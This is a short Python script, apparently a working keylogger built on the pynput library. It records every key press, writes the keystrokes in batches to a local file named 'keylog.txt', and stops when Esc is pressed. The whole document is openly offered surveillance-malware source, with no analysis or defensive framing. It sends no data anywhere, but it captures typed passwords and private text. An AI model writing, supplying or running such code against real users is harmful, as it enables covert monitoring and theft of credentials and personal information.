import pynput
from pynput.keyboard import Key, Listener

# Path to save the log file
log_file = "keylog.txt"

# Initialize a string to store the logs
keys = []

# Function to write the keystrokes to the log file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

# Function to handle each key press
def on_press(key):
    keys.append(key)
    if len(keys) >= 10:  # Adjust this number based on how often you want to write to the file
        write_to_file(keys)
        keys.clear()

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
